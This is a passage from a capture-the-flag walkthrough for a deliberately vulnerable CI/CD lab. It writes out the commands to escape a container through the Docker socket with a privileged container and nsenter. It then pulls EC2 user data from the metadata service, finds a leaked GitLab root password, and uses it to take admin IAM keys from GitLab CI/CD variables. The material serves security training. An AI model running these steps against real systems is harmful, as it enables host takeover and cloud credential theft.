</code></pre></div> <p>This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation">number of options</a> to do this).</p> <div class="highlight"><pre><span></span><code>docker run -it --rm --pid=host --privileged ubuntu bash
</code></pre></div> <p>Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.</p> <div class="highlight"><pre><span></span><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash
</code></pre></div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/rootonbox.png" data-desc-position="bottom"><img alt="Escalating to Root" src="../../../images/aws/capture_the_flag/cicdont/rootonbox.png"></a></p> <p>How fun is that?! We now have root on the underlying host and have escaped the container.</p> <p><strong>Escalating</strong></p> <p>With root on the host, we have a number of options for next steps. We can steal IAM credentials from the <a href="https://hackingthe.cloud/aws/general-knowledge/intro_metadata_service/">metadata service</a>, <a href="https://hackingthe.cloud/aws/enumeration/brute_force_iam_permissions/">brute force</a> our IAM permissions, <a href="https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/">enumerate roles</a> in the account to find out what services are running in the account, attempt to <a href="https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/">escalate IAM privileges</a>, maybe try to <a href="https://hackingthe.cloud/aws/post_exploitation/intercept_ssm_communications/">intercept the SSM agent</a> if it's running on the box? One place we should check before doing all that is the <a href="https://hackingthe.cloud/aws/general-knowledge/introduction_user_data/">user data</a>.</p> <p>User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.</p> <p>Let's check this (remember we are using IMDSv2).</p> <div class="highlight"><pre><span></span><code>TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/user-data/
</code></pre></div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/userdata.png" data-desc-position="bottom"><img alt="Showing User Data" src="../../../images/aws/capture_the_flag/cicdont/userdata.png"></a></p> <p>On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.</p> <p>There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user of GitLab.</p> <p>This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: &lt;what's in the useradata&gt;)</p> <p>After exploring around for a little while, you may stumble into the the <code>infra-deployer</code> project. That sounds important.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/deployer.png" data-desc-position="bottom"><img alt="The infra-deployer Project" src="../../../images/aws/capture_the_flag/cicdont/deployer.png"></a></p> <p>"Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the <code>Settings</code> tab on the left and then click <code>CI/CD</code>. Next, click <code>Expand</code> on the <code>Variables</code> section.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/variables.png" data-desc-position="bottom"><img alt="Showing the Environment Variables" src="../../../images/aws/capture_the_flag/cicdont/variables.png"></a></p> <p>An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this <a href="https://hackingthe.cloud/aws/enumeration/whoami/">without logging to CloudTrail</a> if you were so inclined).</p> <div class="highlight"><pre><span></span><code>export AWS_ACCESS_KEY_ID=AKIA....
export AWS_SECRET_ACCESS_KEY=....
aws sts get-caller-identity
</code></pre></div> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/capture_the_flag/cicdont/identity.png" data-desc-position="bottom"><img alt="Whoami" src="../../../images/aws/capture_the_flag/cicdont/identity.png"></a></p> <p>And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud/discussions/categories/ctf-discussion">GitHub</a>.</p> </details> <h2 id="acknowledgements">Acknowledgements<a class="headerlink" href="#acknowledgements" title="Permanent link">¶</a></h2> <p>These wonderful folks helped beta-test this CTF and provided feedback.</p> <p><a href="https://twitter.com/christophetd">Christophe Tafani-Dereeper</a><br> <a href="https://twitter.com/JBerkowsky">Jake Berkowsky</a><br> <a href="https://github.com/kaushik853">Kaushik Pal</a></p> <aside class="md-source-file"> <span class="md-source-file__fact"> <span class="md-icon" title="Last update"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="February 19, 2024 21:07:18 UTC">February 19, 2024</span> </span> <span class="md-source-file__fact"> <span class="md-icon" title="Created"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="March 5, 2022 04:00:57 UTC">March 5, 2022</span> </span> <span class="md-source-file__fact"> <span class="md-icon" title="Contributors"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"></path></svg> </span> <span>GitHub</span> <nav> <a href="https://github.com/Frichetten" class="md-author" title="@Frichetten"> <img src="https://avatars.githubusercontent.com/u/10386884?v=4&amp;size=72" alt="Frichetten"> </a> </nav> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> </main> <footer class="md-footer"> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-copyright"> Made with <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener"> Material for MkDocs Insiders </a> </div> <div class="md-social"> <a href="https://infosec.exchange/@hackingthecloud" target="_blank" rel="noopener me" title="infosec.exchange" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M433 179.1c0-97.2-63.7-125.7-63.7-125.7-62.5-28.7-228.6-28.4-290.5 0 0 0-63.7 28.5-63.7 125.7 0 115.7-6.6 259.4 105.6 289.1 40.5 10.7 75.3 13 103.3 11.4 50.8-2.8 79.3-18.1 79.3-18.1l-1.7-36.9s-36.3 11.4-77.1 10.1c-40.4-1.4-83-4.4-89.6-54-.6-4.6-.9-9.3-.9-13.9 85.6 20.9 158.7 9.1 178.7 6.7 56.1-6.7 105-41.3 111.2-72.9 9.8-49.8 9-121.5 9-121.5zm-75.1 125.2h-46.6V190.1c0-49.7-64-51.6-64 6.9v62.5H201V197c0-58.5-64-56.6-64-6.9v114.2H90.3c0-122.1-5.2-147.9 18.4-175 25.9-28.9 79.8-30.8 103.8 6.1l11.6 19.5 11.6-19.5c24.1-37.1 78.1-34.8 103.8-6.1 23.7 27.3 18.4 53 18.4 175"></path></svg> </a> <a href="https://bsky.app/profile/hackingthe.cloud" target="_blank" rel="noopener" title="bsky.app" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M407.8 294.7c-3.3-.4-6.7-.8-10-1.3 3.4.4 6.7.9 10 1.3M288 227.1c-26.1-50.7-97.1-145.2-163.1-191.8C61.6-9.4 37.5-1.7 21.6 5.5 3.3 13.8 0 41.9 0 58.4S9.1 194 15 213.9c19.5 65.7 89.1 87.9 153.2 80.7 3.3-.5 6.6-.9 10-1.4-3.3.5-6.6 1-10 1.4-93.9 14-177.3 48.2-67.9 169.9C220.6 589.1 265.1 437.8 288 361.1c22.9 76.7 49.2 222.5 185.6 103.4 102.4-103.4 28.1-156-65.8-169.9-3.3-.4-6.7-.8-10-1.3 3.4.4 6.7.9 10 1.3 64.1 7.1 133.6-15.1 153.2-80.7C566.9 194 576 75 576 58.4s-3.3-44.7-21.6-52.9c-15.8-7.1-40-14.9-103.2 29.8C385.1 81.9 314.1 176.4 288 227.1"></path></svg> </a> <a href="https://x.com/HackingthCloud" target="_blank" rel="noopener" title="x.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"></path></svg> </a> <a href="https://www.linkedin.com/company/hacking-the-cloud/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg> </a> <a href="https://github.com/Hacking-the-Cloud" target="_blank" rel="noopener" title="github.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </a> <a href="https://hackingthe.cloud/feed_rss_created.xml" target="_blank" rel="noopener" title="hackingthe.cloud" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"></path></svg> </a> </div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.indexes", "content.action.edit"], "search": "../../../assets/javascripts/workers/search.26099bd0.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script> <script src="../../../assets/javascripts/bundle.9d1edc04.min.js"></script> <script src="../../../javascripts/matomo.min.js"></script>  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>